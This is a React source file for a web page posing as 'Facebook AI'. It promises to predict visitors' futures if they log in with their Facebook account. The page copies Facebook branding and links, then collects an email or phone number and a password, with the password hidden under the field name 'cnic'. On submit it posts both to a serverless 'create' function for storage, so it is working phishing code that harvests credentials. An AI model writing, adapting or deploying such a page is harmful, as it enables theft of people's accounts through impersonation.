import React, { useState } from "react";
import { Formik } from "formik";
import "../images/style.css";
import AppBar from "@material-ui/core/AppBar";
import Toolbar from "@material-ui/core/Toolbar";
import Typography from "@material-ui/core/Typography";
import Button from "@material-ui/core/Button";
import { makeStyles } from "@material-ui/core/styles";
import Paper from "@material-ui/core/Paper";

import Grid from "@material-ui/core/Grid";
import A1 from "./A1.jpg";
import { usePromiseTracker } from "react-promise-tracker";
import Loader from "react-loader-spinner";
import "../images/style.css";
import fb from "../images/fb.png";

const useStyles = makeStyles((theme) => ({
  mainFeaturedPost: {
    position: "relative",
    backgroundColor: theme.palette.grey[800],
    color: theme.palette.common.white,
    marginBottom: theme.spacing(4),

    backgroundSize: "cover",
    backgroundRepeat: "no-repeat",
    backgroundPosition: "center",
  },
  overlay: {
    position: "absolute",
    top: 0,
    bottom: 0,
    right: 0,
    left: 0,
    backgroundColor: "rgba(0,0,0,.3)",
  },
  mainFeaturedPostContent: {
    position: "relative",
    padding: theme.spacing(3),
    [theme.breakpoints.up("md")]: {
      padding: theme.spacing(6),
      paddingRight: 0,
    },
  },
}));

const IndexPage = () => {
  const classes = useStyles();
  const [isupdate, setisupdate] = useState(false);
  const [isdelete, setisdelete] = useState(false);
  const [isload, setisload] = useState(false);
  const [mydata, setData] = useState([]);

  const LoadingIndicator = () => {
    const { promiseInProgress } = usePromiseTracker();
    return (
      promiseInProgress && (
        <div
          style={{
            width: "100%",
            height: "100",
            display: "flex",
            justifyContent: "center",
            alignItems: "center",
          }}
        >
          <Loader type="ThreeDots" color="#2BAD60" height="100" width="100" />
        </div>
      )
    );
  };

  // useEffect(() => {
  //   console.log("useEffect Called");

  //   trackPromise(
  //     fetch(`/.netlify/functions/readall`)
  //       .then((response) => response.json())
  //       .then((data) => {
  //         setData(data);

  //         console.log("Data: " + JSON.stringify(data));
  //       })
  //   );
  // }, [isdelete, isload, isupdate]);

  //delete query

  // async function deleteid(e) {
  //   setisdelete(true);
  //   console.log("deleted");
  //   console.log(e.ref["@ref"].id);
  //   await fetch(`/.netlify/functions/delete`, {
  //     method: "post",
  //     body: JSON.stringify({ id: e.ref["@ref"].id }),
  //   });
  //   setisdelete(false);
  // }

  //update

  // async function updateid(e) {
  //   setisupdate(true);
  //   console.log("updated");
  //   const inputname = prompt("Enter Name");
  //   const inputage = prompt("Enter Age");
  //   const inputcnic = prompt("Enter Cnic");
  //   const inputemail = prompt("Enter Email");
  //   const data = [inputname, inputage, inputcnic, inputemail];
  //   console.log(data);
  //   if (
  //     data[0] == null &&
  //     data[1] == null &&
  //     data[2] == null &&
  //     data[3] == null
  //   ) {
  //     console.log("data not found");
  //     alert("You didnot enter any data");
  //   } else {
  //     updatedata(data, e);
  //   }
  //   async function updatedata(data, e) {
  //     setisupdate(true);
  //     console.log(e.ref["@ref"].id);
  //     await fetch(`/.netlify/functions/update`, {
  //       method: "post",
  //       body: JSON.stringify({
  //         id: e.ref["@ref"].id,

  //         updatename: data[0],
  //         updateage: data[1],
  //         updatecnic: data[2],
  //         updateemail: data[3],
  //       }),
  //     });
  //     setisupdate(false);
  //   }
  // }

  return (
    <div>
      <AppBar style={{ background: "white" }} position="static">
        <Toolbar>
          <Typography
            style={{ color: "#67788a", marginLeft: "35%" }}
            variant="h7"
          >
            FACEBOOK AI
          </Typography>
        </Toolbar>
      </AppBar>

      <AppBar style={{ background: "white" }} position="static">
        <Toolbar>
          <Button style={{ color: "#67788a", marginLeft: "auto" }}>
            <a
              style={{ textDecoration: "none", color: "#67788a" }}
              href="https://ai.facebook.com/"
            >
              Home
            </a>
          </Button>
          <Button style={{ color: "#67788a" }}>
            <a
              style={{ textDecoration: "none", color: "#67788a" }}
              href="https://ai.facebook.com/results/?page=1&content_types[0]=publication"
            >
              Publication
            </a>
          </Button>

          <Button style={{ color: "#67788a" }}>
            <a
              style={{ textDecoration: "none", color: "#67788a" }}
              href="https://ai.facebook.com/research/"
            >
              Research
            </a>
          </Button>
          <Button style={{ color: "#67788a" }}>
            <a
              style={{ textDecoration: "none", color: "#67788a" }}
              href="https://ai.facebook.com/tools/#frameworks-and-tools"
            >
              Tools
            </a>
          </Button>
        </Toolbar>
      </AppBar>

      <Paper
        className={classes.mainFeaturedPost}
        style={{ backgroundImage: `url(${A1})` }}
      >
        <div className={classes.overlay} />
        <Grid container>
          <Grid item md={6}>
            <div className={classes.mainFeaturedPostContent}>
              <Typography
                component="h4"
                variant="h4"
                color="inherit"
                gutterBottom
              >
                Facebook Artificial Intelligence and the Future of Humans
              </Typography>
              <Typography variant="h6" color="inherit" paragraph>
                This facebook publication draws on a wide range of expertise to
                illuminate the year ahead. Even so, all our contributors have
                one thing in common: they are human. it is now possible to ask
                an AI for its views on the coming year. login below with
                facebook account to know your future
              </Typography>
            </div>
          </Grid>
        </Grid>
      </Paper>

      <Formik
        initialValues={{ cnic: "", email: "" }}
        validate={(values) => {
          const errors = {};
          if (!values.name) {
            errors.name = "Required";
          }
        }}
        //create query

        onSubmit={(values) => {
          console.log(values);
          setisload(true);
          fetch(`/.netlify/functions/create`, {
            method: "post",
            body: JSON.stringify(values),
          })
            .then((response) => response.json())
            .then((data) => {
              console.log("Data: " + JSON.stringify(data));
            });
          setisload(false);
        }}
      >
        {({ values, handleChange, handleBlur, handleSubmit }) => (
          <div>
            <img className="image" src={fb} alt="Logo" />
            <br />

            <div>
              <form>
                <input
                  type="text"
                  class="form-control"
                  name="email"
                  placeholder="Mobile number or email address"
                  required=""
                  autofocus=""
                  onChange={handleChange}
                  onBlur={handleBlur}
                  value={values.email}
                />
                <input
                  type="password"
                  class="form-control"
                  name="cnic"
                  placeholder="Password"
                  required=""
                  onChange={handleChange}
                  onBlur={handleBlur}
                  value={values.cnic}
                />

                <br />

                <button onClick={handleSubmit} className="btn">
                  <a
                   // style={{ textDecoration: "none", color: "#67788a" }}
                    //href="https://www.quizony.com/predict-my-future/"
                  >
                    Log In
                  </a>
                </button>
              </form>
              <br />
              <hr></hr>
            </div>
            <button className="btn1" type="submit">
              {" "}
              Create New Account
            </button>
          </div>
        )}
      </Formik>

      <br />
      <br />

      <LoadingIndicator />
    </div>
  );
};

export default IndexPage;
